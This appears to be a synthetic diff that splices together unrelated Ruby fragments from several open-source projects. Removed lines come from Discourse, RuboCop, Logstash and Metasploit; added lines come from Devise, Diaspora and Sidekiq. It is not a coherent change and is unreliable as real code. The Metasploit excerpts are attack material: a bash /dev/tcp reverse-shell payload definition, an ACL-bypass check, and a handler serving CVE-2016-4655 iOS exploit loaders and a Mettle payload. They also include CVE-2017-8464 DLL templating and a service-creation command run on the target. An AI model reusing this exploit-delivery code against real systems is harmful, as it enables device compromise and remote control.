@@ -1,241 +1,228 @@
 
         
-            def store_optimized_image(file, optimized_image)
-      path = get_path_for_optimized_image(optimized_image)
-      store_file(file, path)
-    end
+          has_many :special_nonexistent_posts, -> { where('posts.body = 'nonexistent'') }, class_name: 'SpecialPost'
+  has_many :special_nonexistent_post_comments, -> { where('comments.post_id' => 0) }, through: :special_nonexistent_posts, source: :comments
+  has_many :nonexistent_comments, through: :posts
     
-        let(:url) { 'https://github.com/example/example.git' }
-    let(:trailing_slash_url) { 'https://github.com/example/example/' }
-    let(:ssh_url) { 'git@github.com:example/example.git' }
-    let(:branch) { 'dev' }
-    
-            expect(json).to be_present
-        expect(json['js.foo']).to eq('bar')
-        expect(json['admin_js.beep']).to eq('boop')
-      end
-    end
+      def initialize(*args)
+    require 'docs'
+    trap('INT') { puts; exit! } # hide backtrace on ^C
+    super
   end
-end
-
     
-          expect(event_old_value).to eq(1)
-      expect(event_new_value).to eq(2)
-      expect(site_setting_value).to eq(2)
-    end
-    
-      def self.views_thresholds
-    results = DB.query(<<~SQL)
-      SELECT ranked.bucket * 5 as percentile, MIN(ranked.views) as views
-      FROM (
-        SELECT NTILE(20) OVER (ORDER BY t.views DESC) AS bucket, t.views
-        FROM (
-          SELECT views
-            FROM topics
-           WHERE deleted_at IS NULL
-             AND archetype <> 'private_message'
-             AND visible = TRUE
-        ) t
-      ) ranked
-      WHERE bucket <= 9
-      GROUP BY bucket
-    SQL
-    
-    
-    {        # Start a new thread and pass the client connection
-        # as the input and output pipe.  Client's are expected
-        # to implement the Stream interface.
-        conn_threads << framework.threads.spawn('BindUdpHandlerSession', false, client) { |client_copy|
-          begin
-            handle_connection(client_copy, opts)
-          rescue
-            elog('Exception raised from BindUdp.handle_connection: #{$!}')
+              if ADD_SUB_ENTRIES_KEYWORDS.include?(node.at_css('.keyword').try(:content))
+            node.css('.subs > li').each do |sub_node|
+              sub_link = sub_node.at_css('a')
+              next unless sub_link['href'].start_with?('#')
+              sub_name = sub_node.content.strip
+              sub_name.remove! %r{\s.*}
+              sub_name.prepend '#{name} '
+              entries << [sub_name, sub_link['href'].remove('#')]
+            end
           end
-        }
-      else
-        wlog('No connection received before the handler completed')
+    
+      # Returns a signed in resource from session (if one exists)
+  def signed_in_resource
+    warden.authenticate(scope: resource_name)
+  end
+    
+        login_as User.create!(email: 'test@test.com', password: 'test123456', password_confirmation: 'test123456')
+    
+          def remove_domain_from_uri(uri)
+        [uri.path.sub(/\A\/+/, '/'), uri.query].compact.join('?')
       end
-    }
-  end
     
+          accessors.each do |accessor|
+        mod.class_eval <<-METHOD, __FILE__, __LINE__ + 1
+          def #{accessor}
+            if defined?(@#{accessor})
+              @#{accessor}
+            elsif superclass.respond_to?(:#{accessor})
+              superclass.#{accessor}
+            else
+              Devise.#{accessor}
+            end
+          end
     
-    {        This will not work on circa 2009 and older Debian-based Linux
-        distributions (including Ubuntu) because they compile bash
-        without the /dev/tcp feature.
-      },
-      'Author'        => 'hdm',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd_bash',
-      'RequiredCmd'   => 'bash-tcp',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
-  end
+              if recoverable.persisted?
+            if recoverable.reset_password_period_valid?
+              recoverable.reset_password(attributes[:password], attributes[:password_confirmation])
+            else
+              recoverable.errors.add(:reset_password_token, :expired)
+            end
+          end
     
-    require 'msf/core/handler/bind_tcp'
-require 'msf/core/payload/windows/x64/bind_tcp_rc4'
+    module Devise
+  module Models
+    # Rememberable manages generating and clearing token for remembering the user
+    # from a saved cookie. Rememberable also has utility methods for dealing
+    # with serializing the user into the cookie and back from the cookie, trying
+    # to lookup the record based on the saved information.
+    # You probably wouldn't use rememberable methods directly, they are used
+    # mostly internally for handling the remember token.
+    #
+    # == Options
+    #
+    # Rememberable adds the following options in devise_for:
+    #
+    #   * +remember_for+: the time you want the user will be remembered without
+    #     asking for credentials. After this time the user will be blocked and
+    #     will have to enter their credentials again. This configuration is also
+    #     used to calculate the expires time for the cookie created to remember
+    #     the user. By default remember_for is 2.weeks.
+    #
+    #   * +extend_remember_period+: if true, extends the user's remember period
+    #     when remembered via cookie. False by default.
+    #
+    #   * +rememberable_options+: configuration options passed to the created cookie.
+    #
+    # == Examples
+    #
+    #   User.find(1).remember_me!  # regenerating the token
+    #   User.find(1).forget_me!    # clearing the token
+    #
+    #   # generating info to put into cookies
+    #   User.serialize_into_cookie(user)
+    #
+    #   # lookup the user based on the incoming cookie information
+    #   User.serialize_from_cookie(cookie_string)
+    module Rememberable
+      extend ActiveSupport::Concern
     
-            By specifying 'pdf' for the URL_TYPE, the module will treat
-        the specified URL(s) as PDF documents. The module will
-        download the documents and extract the authors' names from the
-        document metadata.
+      def test_trigonometric_functions
+    assert_equal 0, CMath.asin(0)
+    assert_equal 0, CMath.acos(1)
+    assert_equal 0, CMath.atan(0)
+    assert_equal 0, CMath.asinh(0)
+    assert_equal 0, CMath.acosh(1)
+    assert_equal 0, CMath.atanh(0)
     
-        if res.body.include?('Administrator')
-      vprint_good('ACL bypass successful')
-      checkcode = CheckCode::Vulnerable
+      it 'returns the next character from the stream' do
+    gz = Zlib::GzipReader.new @io
+    gz.pos.should == 0
+    
+    describe :gzipreader_each, shared: true do
+    
+        quarantine! do # https://bugs.ruby-lang.org/issues/13675
+      describe 'with nil' do
+        it 'does not append anything to the stream' do
+          @gz.ungetbyte nil
+          @gz.read.should == ''
+        end
+    
+        def log_transform(*args, from: caller[1][/`.*'/][1..-2].sub(/^block in /, ''))
+      puts '    #{cyan from}#{cyan ': #{args * ', '}' unless args.empty?}'
+    end
+    
+      # Raise exceptions instead of rendering exception templates.
+  config.action_dispatch.show_exceptions = false
+    
+    class SessionsController < Devise::SessionsController
+  # rubocop:disable Rails/LexicallyScopedActionFilter
+  before_action :authenticate_with_2fa, only: :create
+  after_action :reset_authentication_token, only: :create
+  before_action :reset_authentication_token, only: :destroy
+  # rubocop:enable Rails/LexicallyScopedActionFilter
+    
+      # ==> Configuration for :encryptable
+  # Allow you to use another encryption algorithm besides bcrypt (default). You can use
+  # :sha1, :sha512 or encryptors from others authentication tools as :clearance_sha1,
+  # :authlogic_sha512 (then you should set stretches above to 20 for default behavior)
+  # and :restful_authentication_sha1 (then you should set stretches to 10, and copy
+  # REST_AUTH_SITE_KEY to pepper).
+  #
+  # Require the `devise-encryptable` gem when using anything other than bcrypt
+  # config.encryptor = :sha512
+    
+    if rails_env != 'development'
+  config('path vendor/bundle')
+  config('frozen true')
+  config('disable_shared_gems true')
+end
+    
+        unless user
+      EmailInviter.new(email, inviter).send!
+      flash[:notice] = 'invitation sent to #{email}'
     else
-      vprint_error('ACL bypass unsuccessful')
-      return CheckCode::Safe
+      flash[:notice]= 'error sending invite to #{email}'
     end
+    redirect_to user_search_path, :notice => flash[:notice]
+  end
     
-      def on_request_uri(cli, request)
-    print_status('Request from #{request['User-Agent']}')
-    if request.uri =~ %r{/loader32$}
-      print_good('armle target is vulnerable.')
-      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'exploit32' )
-      loader_data = File.read(local_file, {:mode => 'rb'})
-      srvhost = Rex::Socket.resolv_nbo_i(srvhost_addr)
-      config = [srvhost, srvport].pack('Nn') + payload_url
-      payload_url_index = loader_data.index('PAYLOAD_URL')
-      loader_data[payload_url_index, config.length] = config
-      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
-      return
-    elsif request.uri =~ %r{/loader64$}
-      print_good('aarch64 target is vulnerable.')
-      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'loader' )
-      loader_data = File.read(local_file, {:mode => 'rb'})
-      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
-      return
-    elsif request.uri =~ %r{/exploit64$}
-      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'exploit' )
-      loader_data = File.read(local_file, {:mode => 'rb'})
-      payload_url_index = loader_data.index('PAYLOAD_URL')
-      loader_data[payload_url_index, payload_url.length] = payload_url
-      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
-      print_status('Sent exploit (#{loader_data.size} bytes)')
-      return
-    elsif request.uri =~ %r{/payload32$}
-      payload_data = MetasploitPayloads::Mettle.new('arm-iphone-darwin').to_binary :dylib_sha1
-      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})
-      print_status('Sent payload (#{payload_data.size} bytes)')
-      return
-    end
-    html = %Q^
-<html>
-<body>
-<script>
-    
-        path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-8464')
-    arch = target['Arch'] == ARCH_ANY ? payload.arch.first : target['Arch']
-    datastore['EXE::Path'] = path
-    datastore['EXE::Template'] = ::File.join(path, 'template_#{arch}_windows.dll')
-    
-          key = service_create(nam, :path=>'cmd /c \'#{script_on_target}\'',:display=>description)
-    
-    @@ chat
-<pre id='chat'></pre>
-<form>
-  <input id='msg' placeholder='type message here...' />
-</form>
-    
-        def prefers_plain_text?(env)
-      !(Request.new(env).preferred_type('text/plain','text/html') == 'text/html') &&
-      [/curl/].index { |item| item =~ env['HTTP_USER_AGENT'] }
-    end
-    
-          def call(env)
-        status, headers, body = super
-        response = Rack::Response.new(body, status, headers)
-        request = Rack::Request.new(env)
-        remove_bad_cookies(request, response)
-        response.finish
-      end
-    
-            close_body(body) if reaction
-    
-            post '/', :file => Rack::Test::UploadedFile.new(temp_file.path), :other => '<bar>'
-        expect(body).to eq('_escaped_params_tmp_file\nhello world\n&lt;bar&gt;')
-      ensure
-        File.unlink(temp_file.path)
+          def render_error(error_description, detailed_error=nil)
+        @error_description = error_description
+        @detailed_error = detailed_error
+        if request.format == :mobile
+          render 'api/openid_connect/error/error.mobile', layout: 'application.mobile'
+        else
+          render 'api/openid_connect/error/error', layout: 'with_header_with_footer'
+        end
       end
     end
   end
 end
 
     
-        private
-    def uncompress(source)
-      temporary_directory = Stud::Temporary.pathname
-      LogStash::Util::Zip.extract(source, temporary_directory, LOGSTASH_PATTERN_RE)
-      temporary_directory
-    rescue Zip::Error => e
-      # OK Zip's handling of file is bit weird, if the file exist but is not a valid zip, it will raise
-      # a `Zip::Error` exception with a file not found message...
-      raise InvalidPackError, 'Cannot uncompress the zip: #{source}'
+    #   Copyright (c) 2010-2011, Diaspora Inc.  This file is
+#   licensed under the Affero General Public License version 3 or later.  See
+#   the COPYRIGHT file.
+    
+      def create
+    begin
+      comment = comment_service.create(params[:post_id], params[:text])
+    rescue ActiveRecord::RecordNotFound
+      render plain: I18n.t('comments.create.error'), status: 404
+      return
     end
     
-        # any errors will be logged to $stderr by invoke!
-    # Bundler cannot update and clean gems in one operation so we have to call the CLI twice.
-    options = {:update => plugins, :rubygems_source => gemfile.gemset.sources}
-    options[:local] = true if local?
-    output = LogStash::Bundler.invoke!(options)
-    # We currently dont removed unused gems from the logstash installation
-    # see: https://github.com/elastic/logstash/issues/6339
-    # output = LogStash::Bundler.invoke!(:clean => true)
-    display_updated_plugins(previous_gem_specs_map)
-  rescue => exception
-    gemfile.restore!
-    report_exception('Updated Aborted', exception)
-  ensure
-    display_bundler_output(output)
+      def contacts_by_type(type)
+    order = ['profiles.first_name ASC', 'profiles.last_name ASC', 'profiles.diaspora_handle ASC']
+    contacts = case type
+      when 'all'
+        order.unshift 'receiving DESC'
+        current_user.contacts
+      when 'only_sharing'
+        current_user.contacts.only_sharing
+      when 'receiving'
+        current_user.contacts.receiving
+      when 'by_aspect'
+        order.unshift 'contact_id IS NOT NULL DESC'
+        contacts_by_aspect(@aspect.id)
+      else
+        raise ArgumentError, 'unknown type #{type}'
+      end
+    contacts.includes(person: :profile)
+            .order(order)
   end
     
-          puts user_feedback_string_for('halting', args[:platform], machines, {'experimental' => experimental})
-      options = {:debug => ENV['LS_QA_DEBUG']}
+    #   Copyright (c) 2010-2011, Diaspora Inc.  This file is
+#   licensed under the Affero General Public License version 3 or later.  See
+#   the COPYRIGHT file.
     
+        it 'allows multiple calls' do
+      SetWorker.set(queue: :foo).set(bar: 'xyz').perform_async
     
-# This is a non obvious hack,
-# EllipticalCurve are not completely implemented in JRuby 9k and the new version of SSH from the standard library
-# use them.
-#
-# Details: https://github.com/jruby/jruby-openssl/issues/105
-Net::SSH::Transport::Algorithms::ALGORITHMS.values.each { |algs| algs.reject! { |a| a =~ /^ecd(sa|h)-sha2/ } }
-Net::SSH::KnownHosts::SUPPORTED_TYPE.reject! { |t| t =~ /^ecd(sa|h)-sha2/ }
+        obj = Helpers.new('HTTP_ACCEPT_LANGUAGE' => 'ru,en')
+    assert_equal 'ru', obj.locale
     
-          it 'does not care' do
-        expect_no_offenses(source)
-      end
+        assert_nil dead_set.find_job('000101')
+    assert dead_set.find_job('000102')
+    assert dead_set.find_job('000103')
+  end
+end
+
+    
+      it 'logs large payloads' do
+    output = capture_logging(Logger::WARN) do
+      SomeClass.delay.doit('a' * 8192)
     end
+    assert_match(/#{SomeClass}.doit job argument is/, output)
+  end
     
-    module RuboCop
-  module AST
-    # A node extension for `for` nodes. This will be used in place of a plain
-    # node when the builder constructs the AST, making its methods available
-    # to all `for` nodes within RuboCop.
-    class ForNode < Node
-      # Returns the keyword of the `for` statement as a string.
-      #
-      # @return [String] the keyword of the `until` statement
-      def keyword
-        'for'
-      end
+    describe Sidekiq::Middleware do
+  before do
+    $errors = []
+  end
     
-    module RuboCop
-  module AST
-    # A node extension for `hash` nodes. This will be used in place of a plain
-    # node when the builder constructs the AST, making its methods available
-    # to all `hash` nodes within RuboCop.
-    class HashNode < Node
-      # Returns an array of all the key value pairs in the `hash` literal.
-      #
-      # @return [Array<PairNode>] an array of `pair` nodes
-      def pairs
-        each_pair.to_a
-      end
+    class TimedWorker
+  include Sidekiq::Worker
